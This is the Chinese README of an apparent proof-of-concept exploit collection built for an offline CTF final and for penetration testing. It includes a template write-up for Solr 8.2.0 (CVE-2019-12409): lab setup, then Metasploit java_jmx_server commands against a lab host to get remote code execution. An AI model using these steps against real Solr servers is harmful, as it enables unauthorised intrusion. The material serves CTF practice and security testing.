# poc-hub
收集我复现过的各种poc于此处，同时编写工具自动化检测并利用

此项目源于要参加一场线下的CTF决赛，由于断网，故需要大量本地poc，考虑到也可为日后的渗透测试工作提供便利

当前仓库没有漏洞分析，只有POC，都是经过手动验证过的，可武器化且开箱即用的

漏洞复现模板如下：
```
# 0x00 复现环境
使用复现环境：本地搭建的环境  
复现版本：Solr 8.2.0

# 0x01 环境搭建
目标环境：centos7_x64_en-us + solr-8.2.0.tgz + openjdk version "1.8.0_181"  
wget https://archive.apache.org/dist/lucene/solr/8.2.0/solr-8.2.0.tgz  
tar -xvf ./solr-8.2.0.tgz  
cd ./solr-8.2.0.tgz/bin/  
./solr start -force#默认启动端口8983  
启动后浏览器访问http://127.0.0.1:8983/ ，出现下图所示表示环境配置完成：  
![image](./1.png)  

# 0x02 利用条件
无

# 0x03 影响版本
Solr 8.1.1  
Solr 8.2.0

# 0x04 漏洞复现
攻击环境：kali2020 + msf5  
msfconsole  
use exploit/multi/misc/java_jmx_server  
set rhosts 172.16.35.138  
set rport 18983  
run  
![image](./2.png)

# 0x05 踩坑记录
坑1：  
centos7下默认开启防火墙，需要临时关闭防火墙：“systemctl stop firewalld”

# 0x06 参考链接
https://github.com/jas502n/CVE-2019-12409

```
